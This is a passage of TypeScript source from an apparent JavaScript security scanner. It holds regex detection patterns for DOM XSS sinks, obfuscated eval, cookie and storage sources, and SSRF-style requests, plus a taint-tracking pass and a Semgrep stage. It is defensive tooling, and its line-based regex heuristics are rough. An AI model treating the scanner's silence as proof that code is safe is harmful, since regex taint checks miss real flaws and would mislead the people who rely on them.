    { pattern: /new\s+EventSource\s*\(\s*[^'"]/, name: 'EventSource(dynamic)', cwe: 'CWE-918', severity: 'warning' },
  ];

  /** Storage Sinks - Can lead to persistent XSS */
  static SINKS_STORAGE: SinkPattern[] = [
    { pattern: /localStorage\.setItem\s*\(/, name: 'localStorage.setItem()', cwe: 'CWE-79', severity: 'info' },
    { pattern: /sessionStorage\.setItem\s*\(/, name: 'sessionStorage.setItem()', cwe: 'CWE-79', severity: 'info' },
    { pattern: /document\.cookie\s*=/, name: 'document.cookie assignment', cwe: 'CWE-79', severity: 'info' },
  ];

  /** PostMessage Sinks - Can lead to cross-origin attacks */
  static SINKS_POSTMESSAGE: SinkPattern[] = [
    { pattern: /\.postMessage\s*\([^,]+,\s*['"]\*['"]/, name: 'postMessage(*)', cwe: 'CWE-346', severity: 'warning' },
    { pattern: /\.postMessage\s*\(/, name: 'postMessage()', cwe: 'CWE-346', severity: 'info' },
  ];

  /** Combined sinks for backward compatibility */
  static DOM_XSS_SINKS: SinkPattern[] = [
    ...Scanner.SINKS_HTML_INJECTION,
    ...Scanner.SINKS_REPLACE_XSS,
    ...Scanner.SINKS_JS_EXECUTION,
    ...Scanner.SINKS_OPEN_REDIRECT,
    ...Scanner.SINKS_LINK_MANIPULATION,
    ...Scanner.SINKS_AJAX,
    ...Scanner.SINKS_WEBSOCKET,
    ...Scanner.SINKS_STORAGE,
    ...Scanner.SINKS_POSTMESSAGE,
  ];

  // ─────────────────────────────────────────────────────────────────────────────────────────────
  // DIRECT DOM XSS PATTERNS - Same-line source→sink (highest confidence)
  // ─────────────────────────────────────────────────────────────────────────────────────────────

  static DOM_XSS_DIRECT: SinkPattern[] = [
    // innerHTML with sources
    { 
      pattern: /\.innerHTML\s*=\s*[^;]*(?:location(?:\?\.|\.)(?:search|hash|href|pathname)|(?:new\s+)?URLSearchParams|searchParams(?:\.get)?|decodeURIComponent\s*\(\s*(?:location|params)|event\.(?:data|origin|source)|localStorage|sessionStorage|document\.referrer|window\.(?:name|opener|parent|top)|document\.cookie)/i, 
      name: 'innerHTML = user input',
      cwe: 'CWE-79'
    },
    { 
      pattern: /document\.write(?:ln)?\s*\([^)]*(?:location(?:\?\.|\.)(?:search|hash|href)|(?:new\s+)?URLSearchParams|searchParams|decodeURIComponent|event\.data|localStorage|sessionStorage|document\.referrer|window\.(?:name|opener|parent))/i, 
      name: 'document.write with user input',
      cwe: 'CWE-79'
    },
    { 
      pattern: /\.innerHTML\s*=\s*[^;]*\$\{[^}]*\}/, 
      name: 'innerHTML with template literal',
      cwe: 'CWE-79'
    },
    { 
      pattern: /insertAdjacentHTML\s*\([^,]+,\s*[^)]*(?:location|URLSearchParams|searchParams|event\.data|localStorage|sessionStorage|document\.referrer|window\.name)/i, 
      name: 'insertAdjacentHTML with user input',
      cwe: 'CWE-79'
    },
    { 
      pattern: /eval\s*\(\s*event\.(?:data|origin|source)\b/, 
      name: 'eval(event.data) postMessage XSS',
      cwe: 'CWE-94'
    },
    
    // Network sinks with user input
    { 
      pattern: /\bfetch\s*\(\s*[^,)]*(?:location|searchParams|event\.data|localStorage|sessionStorage|document\.referrer|window\.name|URLSearchParams|decodeURIComponent)/i, 
      name: 'fetch() with user-controlled URL',
      cwe: 'CWE-918'
    },
    { 
      pattern: /\bnew\s+WebSocket\s*\(\s*[^)]*(?:location|searchParams|event\.data|localStorage|sessionStorage)/i, 
      name: 'WebSocket with user-controlled URL',
      cwe: 'CWE-918'
    },
    
    // Code execution with user input
    { 
      pattern: /eval\s*\(\s*[^)]*(?:location|searchParams|event\.data|localStorage|sessionStorage|document\.referrer|window\.name|URLSearchParams|decodeURIComponent)/i, 
      name: 'eval() with user input',
      cwe: 'CWE-94'
    },
    { 
      pattern: /new\s+Function\s*\(\s*[^)]*(?:location|searchParams|event\.data|localStorage|sessionStorage)/i, 
      name: 'Function constructor with user input',
      cwe: 'CWE-94'
    },

    // Obfuscated / bracket notation - source or sink in obfuscated form
    { pattern: /\[\s*['"]innerHTML['"]\s*\]\s*=\s*[^;]*(?:location|searchParams|event\.data|URLSearchParams|decodeURIComponent)/i, name: 'el["innerHTML"] = user input (obfuscated)', cwe: 'CWE-79' },
    { pattern: /\.innerHTML\s*=\s*[^;]*(?:location|window)\s*\[\s*['"][^'"]+['"]\s*\]/i, name: 'innerHTML = location["..."] (obfuscated)', cwe: 'CWE-79' },
    { pattern: /(?:window|globalThis)\s*\[\s*['"]eval['"]\s*\]\s*\([^)]*(?:event\.data|location|searchParams)/i, name: 'window["eval"](user input)', cwe: 'CWE-94' },
    { pattern: /(?:document|window)\s*\[\s*['"]write['"]\s*\]\s*\([^)]*(?:location|searchParams|event\.data)/i, name: 'document["write"](user input)', cwe: 'CWE-79' },

    // Obfuscated eval (atob / String.fromCharCode / indirect eval) — often used to hide payloads
    { pattern: /eval\s*\(\s*atob\s*\(/, name: 'eval(atob(...)) obfuscated code execution', cwe: 'CWE-94' },
    { pattern: /eval\s*\(\s*String\.fromCharCode\s*\(/, name: 'eval(String.fromCharCode(...)) obfuscated', cwe: 'CWE-94' },
    { pattern: /\(\s*0\s*,\s*eval\s*\)\s*\([^)]*(?:location|searchParams|event\.data|\w+)/, name: 'indirect eval with user input', cwe: 'CWE-94' },
    { pattern: /(?:window|globalThis)\s*\[\s*['"]eval['"]\s*\]\s*\(\s*atob\s*\(/, name: 'window["eval"](atob(...)) obfuscated', cwe: 'CWE-94' },
  ];

  // ─────────────────────────────────────────────────────────────────────────────────────────────
  // SERVER-SIDE SOURCES - Request data
  // ─────────────────────────────────────────────────────────────────────────────────────────────

  static SERVER_SOURCES: RegExp[] = [
    /\breq\.(?:body|query|params|headers|cookies)\b/,
    /\brequest\.(?:body|query|params|headers|cookies)\b/,
    /\bctx\.(?:request|query|params|body|headers)\b/,
    /\bc\.(?:req|body|query|param)\b/, // Hono
    /\bevent\.(?:body|queryStringParameters|headers)\b/, // Lambda
    /\bargs\b/i, // GraphQL resolvers
    /\binput\b/i, // GraphQL mutations
    /\bvariables\b/i, // GraphQL
  ];

  // ─────────────────────────────────────────────────────────────────────────────────────────────
  // SANITIZER PATTERNS - Detection of security controls
  // ─────────────────────────────────────────────────────────────────────────────────────────────

  private static readonly SANITIZERS = /(DOMPurify\.sanitize|sanitizeHtml|sanitize-html|html-entities|he\.encode|escapeHtml|_.escape|createTextNode|\.textContent\s*=|\.innerText\s*=|xss\(|validator\.|zod\.|yup\.|joi\.|ajv\.)/i;
  
  private static readonly URL_VALIDATORS = /(validateUrl|isValidUrl|isSafeUrl|allowlist|whitelist|origin|isSameOrigin|isInternalUrl|parseUrl)/i;
  
  private static readonly PATH_VALIDATORS = /(normalize|resolve|basename|sanitizePath|isAbsolute|validatePath|path\.join\s*\([^,]+,\s*['"])/i;

  // ═══════════════════════════════════════════════════════════════════════════════════════════════
  // CONSTRUCTOR
  // ═══════════════════════════════════════════════════════════════════════════════════════════════

  constructor() {
    this.rulesDir = getRulesDir();
    this.semgrepRules = this.loadSemgrepRules();
  }

  // ═══════════════════════════════════════════════════════════════════════════════════════════════
  // MAIN SCAN ENTRY POINT
  // ═══════════════════════════════════════════════════════════════════════════════════════════════

  async scanJavaScript(
    code: string,
    url: string,
    onPhase?: (phase: number, message: string) => void,
    customPatterns?: string[]
  ): Promise<ScanResult[]> {
    const results: ScanResult[] = [];
    code = this.sanitizeScannableJavaScript(code);

    if (!code || !code.trim()) {
      return results;
    }

    // Size limit
    const MAX_SCAN_SIZE = 10 * 1024 * 1024; // 10 MB
    if (code.length > MAX_SCAN_SIZE) {
      if (!this.warnedLargeScan) {
        this.warnedLargeScan = true;
        console.warn(`[Scanner] Code too large (${(code.length / 1024 / 1024).toFixed(2)} MB), truncating`);
      }
      code = code.substring(0, MAX_SCAN_SIZE);
    }

    // Prettify minified code
    const isMinified = code.split('\n').length < 10 && code.length > 1000;
    const prettierTimeoutMs = code.length > 500000 ? 12000 : 5000;
    if (isMinified) {
      try {
        code = await this.prettifyWithTimeout(code, prettierTimeoutMs);
      } catch (error) {
        const msg = String((error as Error)?.message || error).split('\n')[0];
        console.warn('[Scanner] Prettier formatting failed, using fallback:', msg);
        code = this.formatMinifiedCode(code);
      }
    }

    const lines = code.split('\n');
    const lineOffsets = this.buildLineOffsets(code);

    // Early skip: if code has no sink-like APIs, skip heavy phase 1 (taint + all built-in rules)
    const hasSinkKeywords = /innerHTML|outerHTML|eval\s*\(|document\.write|insertAdjacentHTML|location\.(href|assign|replace)|location\s*=|fetch\s*\(|import\s*\(|\.postMessage\s*\(|setTimeout\s*\(\s*[^'"]|setInterval\s*\(\s*[^'"]|new\s+Function\s*\(|dangerouslySetInnerHTML|__html\s*:|v-html|x-html|\.html\s*\(/.test(code);
    const taintedVars = hasSinkKeywords ? this.buildTaintMap(lines) : new Map<string, TaintedVariable>();

    const ctx: DetectionContext = {
      code,
      lines,
      lineOffsets,
      url,
      taintedVars,
    };

    // Phase 1: Built-in rules (skipped when no sink keywords to avoid noise and save time)
    onPhase?.(1, hasSinkKeywords ? 'Phase 1: Built-in rules (AST / regex / taint)' : 'Phase 1: Skipped (no sink keywords)');
    const phase1Results = hasSinkKeywords ? this.runPhase1BuiltInRules(ctx) : [];
    results.push(...phase1Results);

    // Phase 2: Semgrep
    onPhase?.(2, 'Phase 2: Semgrep');
    const tmpdir = require('os').tmpdir();
    const scanDir = path.join(tmpdir, `scan-${Date.now()}`);
    const scanFile = path.join(scanDir, 'scan.js');

    try {
      fs.mkdirSync(scanDir, { recursive: true });
      fs.writeFileSync(scanFile, code, { encoding: 'utf8', flag: 'w' });

      try {
        const semgrepResults = await this.runSemgrepRules(scanFile, url, code);
        results.push(...semgrepResults);
      } catch (semgrepError) {
        const errorMsg = String((semgrepError as Error)?.message || semgrepError || 'Unknown error');
        const isPathOrCommandError = /command failed|path.*not.*found|invalid.*path|wsl|\/mnt\/c/i.test(errorMsg);
        if (!isPathOrCommandError) {
          console.warn('[Scanner] Semgrep scan failed:', errorMsg.split('\n')[0]);
        }
        if (results.length === 0) {
          results.push(this.createValidatedResult({
            ruleId: 'scan-skipped',
            severity: 'info',
            message: 'Semgrep unavailable - using regex-only detection.',
            line: 0,
            column: 0,
            file: url,
          }));
        }
      }
    } catch (fileError) {
      console.warn('[Scanner] Failed to create temp file for Semgrep:', String((fileError as Error)?.message || fileError));
    } finally {
      // Cleanup temp files
      try {
        if (fs.existsSync(scanFile)) fs.unlinkSync(scanFile);
        if (fs.existsSync(scanDir)) {
          try {
            fs.rmdirSync(scanDir);
          } catch {
            try {
              require('fs').rmSync(scanDir, { recursive: true, force: true });
            } catch {
              // Ignore cleanup errors
            }
          }
        }
      } catch {
        /* ignore cleanup errors */
      }
    }

    // Phase 3: User-provided regex patterns (optional)
    if (customPatterns?.length) {
      onPhase?.(3, 'Phase 3: Custom patterns');
      const customResults = this.runCustomPatterns(ctx, customPatterns);
      results.push(...customResults);
    }

    return this.dedupeAndEnrich(results, ctx);
  }

  /** Run user-provided regex patterns against code; each match becomes an info-level finding. */
  private runCustomPatterns(ctx: DetectionContext, patterns: string[]): ScanResult[] {
    const results: ScanResult[] = [];
    const { code, lines, lineOffsets, url } = ctx;
    const MAX_MATCHES_PER_PATTERN = 50;

    const indexToLineColumn = (index: number): { line: number; column: number } => {
      let line = 1;
      for (let i = 0; i < lineOffsets.length; i++) {
        if (lineOffsets[i] <= index) line = i + 1;
        else break;
      }
      const col = index - (lineOffsets[line - 1] ?? 0) + 1;
      return { line, column: Math.max(1, col) };
    };

    for (const patternStr of patterns) {
      const trimmed = patternStr.trim();
      if (!trimmed) continue;
      let re: RegExp;
      try {
        re = new RegExp(trimmed, 'g');
      } catch {
        continue;
      }
      let count = 0;
      let m: RegExpExecArray | null;
      re.lastIndex = 0;
      while ((m = re.exec(code)) !== null && count < MAX_MATCHES_PER_PATTERN) {
        count++;
        const { line, column } = indexToLineColumn(m.index);
        const matched = (m[0] || '').slice(0, 300);
        results.push(this.createValidatedResult({
          ruleId: 'custom-pattern',
          severity: 'info',
          message: `Custom pattern match: ${trimmed.slice(0, 60)}${trimmed.length > 60 ? '…' : ''}`,
          line,
          column,
          file: url,
          pattern: trimmed,
          matchedCode: matched,
          contextCode: matched,
        }));
      }
    }
    return results;
  }

  // ═══════════════════════════════════════════════════════════════════════════════════════════════
  // TAINT TRACKING - Build comprehensive taint map
  // ═══════════════════════════════════════════════════════════════════════════════════════════════

  /** Sanitizer patterns that neutralize tainted data */
  private static readonly SANITIZER_PATTERNS: Array<{ pattern: RegExp; name: string; effective: boolean }> = [
    // HTML sanitizers
    { pattern: /DOMPurify\.sanitize\s*\(/, name: 'DOMPurify.sanitize()', effective: true },
    { pattern: /sanitizeHtml\s*\(/, name: 'sanitize-html', effective: true },
    { pattern: /xss\s*\(/, name: 'xss library', effective: true },
    { pattern: /\.sanitize\s*\(/, name: 'generic sanitize()', effective: true },
    { pattern: /createTextNode\s*\(/, name: 'createTextNode()', effective: true },
    { pattern: /\.textContent\s*=/, name: 'textContent assignment', effective: true },
    { pattern: /\.innerText\s*=/, name: 'innerText assignment', effective: true },
    
    // Encoding
    { pattern: /encodeURIComponent\s*\(/, name: 'encodeURIComponent()', effective: true },
    { pattern: /encodeURI\s*\(/, name: 'encodeURI()', effective: true },
    { pattern: /escape\s*\(/, name: 'escape()', effective: false }, // Deprecated, not effective
    { pattern: /he\.encode\s*\(/, name: 'he.encode()', effective: true },
    { pattern: /_.escape\s*\(/, name: 'lodash.escape()', effective: true },
    { pattern: /escapeHtml\s*\(/i, name: 'escapeHtml()', effective: true },
    
    // Validation (reduces controllability but doesn't fully sanitize)
    { pattern: /parseInt\s*\(/, name: 'parseInt()', effective: true },
    { pattern: /parseFloat\s*\(/, name: 'parseFloat()', effective: true },
    { pattern: /Number\s*\(/, name: 'Number()', effective: true },
    { pattern: /Boolean\s*\(/, name: 'Boolean()', effective: true },
    { pattern: /JSON\.parse\s*\(/, name: 'JSON.parse()', effective: false }, // Can still have nested taint
    
    // URL validation
    { pattern: /new\s+URL\s*\([^)]+\)\.origin/, name: 'URL origin check', effective: true },
    { pattern: /\.startsWith\s*\(\s*['"]https?:\/\//, name: 'URL prefix check', effective: false }, // Can be bypassed
    { pattern: /isValidUrl\s*\(/i, name: 'URL validation', effective: false }, // Unknown implementation
    { pattern: /validateUrl\s*\(/i, name: 'URL validation', effective: false },
  ];

  private buildTaintMap(lines: string[]): Map<string, TaintedVariable> {
    const tainted = new Map<string, TaintedVariable>();
    
    // Combine all source patterns with their metadata
    const allSources: Array<{ pattern: RegExp; name: string; controllability: 'high' | 'medium' | 'low' }> = [
      ...Scanner.DOM_SOURCES_HIGH,
      ...Scanner.DOM_SOURCES_MEDIUM,
      ...Scanner.DOM_SOURCES_LOW,
      ...Scanner.FRAMEWORK_SOURCES.map(s => ({ pattern: s.pattern, name: s.name, controllability: s.controllability })),
    ];
    
    // First pass: identify direct sources with controllability
    // Process each statement (split by ;) for multi-statement lines
    for (let i = 0; i < lines.length; i++) {
      const line = lines[i];
      const segments = line.split(';').map(s => s.trim()).filter(Boolean);

      for (const segment of segments) {
        const matchedSource = allSources.find(s => s.pattern.test(segment)) ??
          (Scanner.SERVER_SOURCES.some(p => p.test(segment)) ? { pattern: /./, name: 'server-input', controllability: 'high' as const } : null);
        if (!matchedSource) continue;

        // Variable declaration: const/let/var name = ...
        const declMatch = /(?:const|let|var)\s+(\w+)\s*=\s*(.+)$/.exec(segment);
        if (declMatch) {
          const [, varName, expr] = declMatch;
          const exprTrimmed = expr.trim();
          if (matchedSource.pattern.test(exprTrimmed) || Scanner.SERVER_SOURCES.some(p => p.test(exprTrimmed))) {
            tainted.set(varName, {
              name: varName,
              sourceLine: i + 1,
              sourceColumn: line.indexOf(varName) + 1,
              sourceExpression: exprTrimmed.slice(0, 150),
              sourceName: matchedSource.name,
              controllability: matchedSource.controllability,
              propagationChain: [],
              sanitized: false,
            });
          }
          continue;
        }

        // Destructuring: const { a, b } = ...
        const destructMatch = /(?:const|let|var)\s*\{([^}]+)\}\s*=\s*(.+)$/.exec(segment);
        if (destructMatch) {
          const [, vars, expr] = destructMatch;
          const exprTrimmed = expr.trim();
          if (matchedSource.pattern.test(exprTrimmed) || Scanner.SERVER_SOURCES.some(p => p.test(exprTrimmed))) {
            vars.split(',').forEach(part => {
              const name = part.trim().split(':')[0].trim();
              if (name && /^\w+$/.test(name)) {
                tainted.set(name, {
                  name,
                  sourceLine: i + 1,
                  sourceColumn: line.indexOf(name) + 1,
                  sourceExpression: exprTrimmed.slice(0, 150),
                  sourceName: matchedSource.name,
                  controllability: matchedSource.controllability,
                  propagationChain: [],
                  sanitized: false,
                });
              }
            });
          }
          continue;
        }

        // Assignment: name = ... (no const/let/var in this segment)
        const assignMatch = /^(\w+)\s*=\s*(.+)$/.exec(segment);
        if (assignMatch) {
          const [, varName, expr] = assignMatch;
          const exprTrimmed = expr.trim();
          if (!tainted.has(varName) && (matchedSource.pattern.test(exprTrimmed) || Scanner.SERVER_SOURCES.some(p => p.test(exprTrimmed)))) {
            tainted.set(varName, {
              name: varName,
              sourceLine: i + 1,
              sourceColumn: line.indexOf(varName) + 1,
              sourceExpression: exprTrimmed.slice(0, 150),
              sourceName: matchedSource.name,
              controllability: matchedSource.controllability,
              propagationChain: [],
              sanitized: false,
            });
          }
        }
      }
    }
    
    // Second pass: propagate taint through assignments and detect sanitization
    const idRegex = /\b([a-zA-Z_$][a-zA-Z0-9_$]*)\b/g;
    let changed = true;
    
    for (let round = 0; changed && round < 25; round++) {
      changed = false;

      for (let i = 0; i < lines.length; i++) {
        const line = lines[i].trim();
        const segments = line.split(';').map(s => s.trim()).filter(Boolean);

        for (const segment of segments) {
          const declMatch = /(?:const|let|var)\s+(\w+)\s*=\s*(.+)$/.exec(segment);
          const assignMatch = !declMatch ? /^(\w+)\s*=\s*(.+)$/.exec(segment) : null;
          const match = declMatch || assignMatch;

          if (!match) continue;

          const [, lhs, rhs] = match;
          const rhsTrimmed = rhs.trim();
          if (tainted.has(lhs)) continue;

          const ids: string[] = [];
          let m: RegExpExecArray | null;
          idRegex.lastIndex = 0;
          while ((m = idRegex.exec(rhsTrimmed)) !== null) {
            ids.push(m[1]);
          }

          const usedTainted = ids.filter(id => tainted.has(id) && !tainted.get(id)!.sanitized);
          if (usedTainted.length > 0) {
            const sourceVar = tainted.get(usedTainted[0])!;

            let isSanitized = false;
            let transform: string | undefined;

            for (const sanitizer of Scanner.SANITIZER_PATTERNS) {
              if (sanitizer.pattern.test(rhsTrimmed) && sanitizer.effective) {
                isSanitized = true;
                transform = sanitizer.name;
                break;
              }
            }

            const hasTypeCoercion = /(?:parseInt|parseFloat|Number|Boolean)\s*\(/.test(rhsTrimmed);

            tainted.set(lhs, {
              name: lhs,
              sourceLine: sourceVar.sourceLine,
              sourceColumn: sourceVar.sourceColumn,
              sourceExpression: sourceVar.sourceExpression,
              sourceName: sourceVar.sourceName,
              controllability: hasTypeCoercion ? 'low' : sourceVar.controllability,
              propagationChain: [
                ...sourceVar.propagationChain,
                { line: i + 1, expression: `${lhs} = ${rhsTrimmed.slice(0, 60)}`, transform }
              ],
              sanitized: isSanitized,
              sanitizerLine: isSanitized ? i + 1 : undefined,
            });
            changed = true;
          }
        }
      }
    }
    
    // Third pass: Check for sanitization applied to existing tainted variables
    for (let i = 0; i < lines.length; i++) {
      const line = lines[i];
      
      for (const [varName, taintInfo] of tainted.entries()) {
        if (taintInfo.sanitized) continue;
        
        // Check if this variable is being sanitized (escape varName to avoid ReDoS / wrong match)
        const escapedVar = varName.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
        for (const sanitizer of Scanner.SANITIZER_PATTERNS) {
          if (sanitizer.effective && 
              new RegExp(`${sanitizer.pattern.source}[^)]*\\b${escapedVar}\\b`).test(line)) {
            // Mark as sanitized from this point forward
            taintInfo.sanitized = true;
            taintInfo.sanitizerLine = i + 1;
            break;
          }
        }
      }
    }
    
    return tainted;
  }

  // ═══════════════════════════════════════════════════════════════════════════════════════════════
  // PHASE 1: BUILT-IN RULES — Ordered for correct taint flow
  // 1) Taint-dependent (source→sink): DOM XSS, Open Redirect, SSRF, DOM Clobbering
  // 2) Injection (require tainted data): Server-side SQL/NoSQL/LDAP, Prototype pollution
  // 3) Pattern + context: Deserialization, Command, Path, Crypto
  // 4) Advanced: Trust boundary, ORM, GraphQL, JWT, Race, Randomness, XXE, PostMessage, Window.name
  // ═══════════════════════════════════════════════════════════════════════════════════════════════

  private runPhase1BuiltInRules(ctx: DetectionContext): ScanResult[] {
    const results: ScanResult[] = [];

    // 1) Taint-based: only report when user-controlled data reaches dangerous sinks
    this.scanDOMXSS(ctx, results);
    this.scanOpenRedirect(ctx, results);
    this.scanSSRF(ctx, results);
    this.scanDOMClobbering(ctx, results);

    // 2) Injection: require tainted data flowing into query/DB sinks
    this.scanServerSideInjection(ctx, results);
    this.scanPrototypePollution(ctx, results);

    // 3) Pattern + context
    this.scanInsecureDeserialization(ctx, results);
    this.scanCommandInjection(ctx, results);
    this.scanPathTraversal(ctx, results);
    this.scanInsecureCrypto(ctx, results);

    // 4) Advanced backend
    this.scanTrustBoundaryCrossing(ctx, results);
    this.scanORMMassAssignment(ctx, results);
    this.scanGraphQLInjection(ctx, results);
    this.scanJWTVulnerabilities(ctx, results);
    this.scanRaceConditions(ctx, results);
    this.scanInsecureRandomness(ctx, results);
    this.scanXXEVulnerabilities(ctx, results);
    this.scanPostMessageVulnerabilities(ctx, results);
    this.scanWindowNameAbuse(ctx, results);
    this.scanPrototypePollutionToDOMXSS(ctx, results);

    return results;
  }

  /**
   * Prototype pollution → DOM XSS gadget chain (2025-2026).
   * Detects merge of user input followed by DOM sink usage of merged result (target).
   */
  private scanPrototypePollutionToDOMXSS(ctx: DetectionContext, results: ScanResult[]): void {
    const { lines, url } = ctx;
    const WINDOW = 25;

    for (let i = 0; i < lines.length; i++) {
      const line = lines[i];
      const mergeMatch = /(?:Object\.(assign|merge)|(?:lodash|_)\s*\.\s*(?:merge|extend)|(?:merge|extend|defaultsDeep)\s*)\s*\(\s*(\w+)\s*,/.exec(line);
      if (!mergeMatch) continue;

      const targetVar = mergeMatch[2];
      if (!targetVar) continue;

      const hasUserInput = /(?:req|request|body|query|params|input|user|data)\b/.test(line);
      if (!hasUserInput) continue;

      const end = Math.min(lines.length, i + WINDOW);
      for (let j = i + 1; j < end; j++) {
        const later = lines[j];
        const hasDomSink = /\.(?:inner|outer)HTML\s*=|document\.write|insertAdjacentHTML|dangerouslySetInnerHTML|__html\s*:|v-html|x-html/i.test(later);
        const escaped = targetVar.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
        const usesTarget = new RegExp(`\\b${escaped}\\b|\\.${escaped}\\.|\\b${escaped}\\[`).test(later);
        if (hasDomSink && usesTarget) {
          const evidence = this.buildEvidenceWindow(ctx, i + 1, 0, line.length);
          results.push(this.createValidatedResult({
            ruleId: 'prototype-pollution-dom-xss-gadget',
            severity: 'error',
            message: 'Prototype pollution → DOM XSS gadget chain: user input merged into object then used in DOM sink. Polluted __proto__/constructor can flow to innerHTML.',
            line: i + 1,
            column: 1,
            file: url,
            pattern: 'merge + DOM sink',
            matchedCode: evidence.text,
            matchedCodeHighlights: evidence.highlights,
            contextCode: lines.slice(i, j + 2).join('\n'),
            contextStartLine: i + 1,
            contextEndLine: j + 2,
            category: 'Prototype-Pollution',
            cwe: 'CWE-1321',
            confidence: 'high',
            impact: 'Attacker can inject __proto__/constructor via payload to achieve DOM XSS.',
            remediation: 'Filter __proto__, constructor, prototype from user input before merge. Use Object.create(null) or Map.',
          }));
          break;
        }
      }
    }
  }

  // ═══════════════════════════════════════════════════════════════════════════════════════════════
  // DOM XSS SCANNER - With source/sink highlighting
  // ═══════════════════════════════════════════════════════════════════════════════════════════════

  private scanDOMXSS(ctx: DetectionContext, results: ScanResult[]): void {
    const { lines, lineOffsets, code, url, taintedVars } = ctx;
    const directPatterns = Scanner.DOM_XSS_DIRECT;
    const dangerousSinks = Scanner.DOM_XSS_SINKS;
    const sanitizers = Scanner.SANITIZERS;
    const staticOnly = /\.innerHTML\s*=\s*['"`]\s*['"`]|\.innerHTML\s*=\s*''|\.innerHTML\s*=\s*""/;

    // 1) Direct same-line DOM XSS (highest confidence)
    lines.forEach((line, index) => {
      if (staticOnly.test(line)) return;

      for (const { pattern, name, cwe } of directPatterns) {
        const m = pattern.exec(line);
        if (!m || sanitizers.test(line)) continue;

        const evidence = this.buildEvidenceWindow(ctx, index + 1, m.index ?? 0, m[0].length);
        
        results.push(this.createValidatedResult({
          ruleId: 'dom-xss-direct',
          severity: 'error',
          message: `DOM XSS: ${name}. User-controlled data flows directly into dangerous sink without sanitization.`,
          line: index + 1,
          column: (m.index ?? 0) + 1,
          file: url,
          pattern: pattern.toString(),
          matchedCode: evidence.text,
          matchedCodeHighlights: evidence.highlights,
          contextCode: evidence.text,
          contextStartLine: evidence.startLine,
          contextEndLine: evidence.endLine,
          category: 'DOM-XSS',
          cwe: cwe || 'CWE-79',
          confidence: 'very-high',
          chainable: true,
          impact: 'Attacker can execute arbitrary JavaScript in victim\'s browser context.',
          remediation: 'Use DOMPurify.sanitize() or textContent instead of innerHTML.',
        }));
      }
    });

    // 2) Tainted variable flows to sinks - with controllability-aware classification
    lines.forEach((line, index) => {
      for (const sink of dangerousSinks) {
        const m = sink.pattern.exec(line);
        if (!m) continue;

        // Get identifiers used in this sink
        const dataIds = this.extractIdentifiersFromSink(line, sink.name);
        const usedTainted = dataIds.filter(id => {
          const taintInfo = taintedVars.get(id);
          // Only consider non-sanitized tainted variables
          return taintInfo && !taintInfo.sanitized;
        });

        if (usedTainted.length === 0) continue;

        // Additional sanitization check in context
        const isSanitized = sanitizers.test(line) || sanitizers.test(this.getContext(ctx, index, 5));
        if (isSanitized) continue;

        const sinkLine = index + 1;
        const taintTraces: TaintTraceEntry[] = [];
        
        // Get earliest source line for context window and determine highest controllability
        let earliestSourceLine = sinkLine;
        let highestControllability: 'high' | 'medium' | 'low' = 'low';
        const controllabilityRank = { high: 3, medium: 2, low: 1 };
        
        for (const varName of usedTainted) {
          const taintInfo = taintedVars.get(varName)!;
          earliestSourceLine = Math.min(earliestSourceLine, taintInfo.sourceLine);
          
          // Track highest controllability level
          if (controllabilityRank[taintInfo.controllability] > controllabilityRank[highestControllability]) {
            highestControllability = taintInfo.controllability;
          }
          
          // Add source trace with controllability info
          taintTraces.push({
            type: 'source',
            line: taintInfo.sourceLine,
            variable: varName,
            expression: taintInfo.sourceExpression,
            description: `[${taintInfo.controllability.toUpperCase()}] ${taintInfo.sourceName}: ${taintInfo.sourceExpression.slice(0, 60)}`,
          });
          
          // Add propagation traces with transform info
          for (const prop of taintInfo.propagationChain) {
            taintTraces.push({
              type: 'propagation',
              line: prop.line,
              expression: prop.expression,
              description: prop.transform 
                ? `Via ${prop.transform}: ${prop.expression}`
                : `Propagates: ${prop.expression}`,
            });
          }
        }
        
        // Add sink trace
        taintTraces.push({
          type: 'sink',
          line: sinkLine,
          column: (m.index ?? 0) + 1,
          expression: line.trim().slice(0, 100),
          description: `Dangerous sink: ${sink.name}`,
        });

        // Build evidence window spanning source to sink
        const evidence = this.buildTaintFlowEvidence(
          ctx,
          earliestSourceLine,
          sinkLine,
          m.index ?? 0,
          m[0].length,
          usedTainted.map(v => taintedVars.get(v)!)
        );

        const sinkCategory = this.categorizeSink(sink);
        const { severity, confidence: baseConf } = this.calculateSeverityFromControllability(
          highestControllability,
          sinkCategory,
          sink.severity as 'error' | 'warning' | 'info' | undefined
        );
        const confidence = this.confidenceFromDistance(earliestSourceLine, sinkLine, baseConf);
        const sourceNames = usedTainted.map(v => taintedVars.get(v)?.sourceName).filter(Boolean).join(', ');
        const message = this.buildVulnerabilityMessage(sinkCategory, sink.name, usedTainted, sourceNames, highestControllability);
        const flowPath = this.buildFlowPathSummary(taintTraces);
        const matchedSnippet = this.cleanEvidenceSnippet(evidence.text, 500, 140);

        results.push(this.createValidatedResult({
          ruleId: `${sinkCategory.toLowerCase().replace(/\s+/g, '-')}-tainted`,
          severity,
          message,
          line: sinkLine,
          column: (m.index ?? 0) + 1,
          file: url,
          pattern: sink.pattern.toString(),
          matchedCode: matchedSnippet,
          matchedCodeHighlights: evidence.highlights,
          contextCode: matchedSnippet,
          contextStartLine: evidence.startLine,
          contextEndLine: evidence.endLine,
          category: sinkCategory,
          cwe: sink.cwe || 'CWE-79',
          confidence,
          chainable: highestControllability === 'high',
          taintTrace: taintTraces,
          trace: taintTraces.map(t => `${t.type.toUpperCase()}: line ${t.line} - ${t.description.slice(0, 60)}`),
          flowPath: flowPath || undefined,
          impact: this.getImpactForCategory(sinkCategory, highestControllability),
          remediation: this.getRemediationForCategory(sinkCategory),
        }));
      }
    });
  }

  /** Categorize sink by vulnerability type */
  private categorizeSink(sink: SinkPattern): string {
    if (Scanner.SINKS_HTML_INJECTION.includes(sink)) return 'DOM-XSS';
    if (Scanner.SINKS_REPLACE_XSS.includes(sink)) return 'Replace-XSS';
    if (Scanner.SINKS_JS_EXECUTION.includes(sink)) return 'JavaScript-Injection';
    if (Scanner.SINKS_OPEN_REDIRECT.includes(sink)) return 'Open-Redirect';
    if (Scanner.SINKS_LINK_MANIPULATION.includes(sink)) return 'Link-Manipulation';
    if (Scanner.SINKS_AJAX.includes(sink)) return 'Client-Side-Request-Forgery';
    if (Scanner.SINKS_WEBSOCKET.includes(sink)) return 'WebSocket-Hijacking';
    if (Scanner.SINKS_STORAGE.includes(sink)) return 'Storage-Injection';
    if (Scanner.SINKS_POSTMESSAGE.includes(sink)) return 'PostMessage-Abuse';
    return 'DOM-XSS';
  }

  /** Calculate severity based on controllability and sink type */
